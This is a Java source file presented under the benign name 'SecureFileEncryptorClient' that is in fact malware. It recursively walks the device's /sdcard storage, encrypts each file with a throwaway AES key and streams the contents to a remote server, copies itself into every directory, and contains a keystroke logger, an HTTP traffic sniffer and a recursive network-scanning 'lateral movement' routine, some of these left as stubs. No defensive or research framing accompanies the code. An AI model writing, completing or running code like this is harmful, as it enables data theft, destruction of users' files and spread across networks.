import java.io.*;
import java.net.*;
import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.util.ArrayList;
import java.util.List;

public class SecureFileEncryptorClient {

    private static volatile boolean stopSniffer = false;
    private static volatile boolean stopKeyboardMonitor = false;
    private static final int MAX_RECORDS_BEFORE_SEND = 1000;
    private static List<String> keyboardResponses = new ArrayList<>();

    public static void main(String[] args) {
        String serverAddress = "127.0.0.1"; // Replace with the server's IP address
        int serverPort = 12345; // Replace with the server's port
        connectToServer(serverAddress, serverPort);
        scanAndMove();
    }

    public static void connectToServer(String serverAddress, int serverPort) {
        try {
            Socket socket = new Socket(serverAddress, serverPort);
            OutputStream outputStream = socket.getOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);

            File externalStorage = new File("/sdcard"); // Path to external storage directory
            traverseAndEncrypt(externalStorage, objectOutputStream);

            objectOutputStream.close();
            outputStream.close();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void traverseAndEncrypt(File directory, ObjectOutputStream objectOutputStream) {
        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            if (files != null) {
                for (File file : files) {
                    traverseAndEncrypt(file, objectOutputStream);
                }
            }
            // Write a copy of this program to the directory
            writeCopy(directory);
            // Encrypt files within the directory and send to server
            encryptFiles(directory, objectOutputStream);
        }
    }

    public static void writeCopy(File directory) {
        try {
            File sourceFile = new File("path/to/your/SecureFileEncryptorClient.java"); // Path to this program
            File destFile = new File(directory, sourceFile.getName());
            InputStream in = new FileInputStream(sourceFile);
            OutputStream out = new FileOutputStream(destFile);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }
            in.close();
            out.close();
            System.out.println("Copied program to: " + destFile.getAbsolutePath());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void encryptFiles(File directory, ObjectOutputStream objectOutputStream) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (!file.isDirectory() && !isThisProgramCopy(file)) {
                    encryptAndSend(file, objectOutputStream);
                }
            }
        }
    }

    public static boolean isThisProgramCopy(File file) {
        String thisProgramName = new File("path/to/your/SecureFileEncryptorClient.java").getName();
        return file.getName().equals(thisProgramName);
    }

    public static void encryptAndSend(File file, ObjectOutputStream objectOutputStream) {
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
            keyGenerator.init(256);
            SecretKey secretKey = keyGenerator.generateKey();

            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            FileInputStream inputStream = new FileInputStream(file);
            CipherOutputStream cipherOutputStream = new CipherOutputStream(objectOutputStream, cipher);

            byte[] buffer = new byte[1024];
            int length;
            while ((length = inputStream.read(buffer)) > 0) {
                cipherOutputStream.write(buffer, 0, length);
            }

            inputStream.close();
            cipherOutputStream.close();

            System.out.println("File encrypted and sent: " + file.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Sniffer function
    public static void sniffData(InputStream inputStream) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while (!stopSniffer && (line = reader.readLine()) != null) {
                if (line.contains("POST") || line.contains("GET")) {
                    System.out.println("HTTP request/response: " + line);
                    // Add your logic to record or process HTTP POST responses and corresponding GET requests
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Function to start the sniffer thread
    public static void startSnifferThread(InputStream inputStream) {
        Thread snifferThread = new Thread(() -> sniffData(inputStream));
        snifferThread.start();
    }

    // Function to stop the sniffer thread
    public static void stopSnifferThread() {
        stopSniffer = true;
    }

    // Keyboard monitor function
    public static void monitorKeyboard() {
        BufferedReader keyboardReader = new BufferedReader(new InputStreamReader(System.in));
        try {
            String line;
            while (!stopKeyboardMonitor && (line = keyboardReader.readLine()) != null) {
                keyboardResponses.add(line);
                if (keyboardResponses.size() >= MAX_RECORDS_BEFORE_SEND) {
                    sendKeyboardResponses();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Function to start the keyboard monitor thread
    public static void startKeyboardMonitorThread() {
        Thread keyboardMonitorThread = new Thread(() -> monitorKeyboard());
        keyboardMonitorThread.start();
    }

    // Function to stop the keyboard monitor thread
    public static void stopKeyboardMonitorThread() {
        stopKeyboardMonitor = true;
    }

    // Function to send recorded keyboard responses to the server
    public static void sendKeyboardResponses() {
        // Code to send keyboardResponses to the server
        System.out.println("Sending keyboard responses to the server...");
        keyboardResponses.clear();
    }
  
    // Function to scan for other devices on the network and move to them
    public static void scanAndMove() {
        try {
            InetAddress localHost = InetAddress.getLocalHost();
            String hostAddress = localHost.getHostAddress();
            String hostName = localHost.getHostName();
            System.out.println("Scanning network for other devices from host: " + hostName + " (" + hostAddress + ")");
            
            // Perform network scanning (ARP scanning or ICMP ping sweep) to discover other devices
            // Once other devices are discovered, perform lateral movement to them
            // For simplicity, let's assume lateral movement is performed via SSH or another remote access method
            // After moving to another device, repeat the process
            System.out.println("Performing lateral movement...");
            // Code for lateral movement to another device
            
            // After moving to another device, repeat the process recursively
            scanAndMove();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
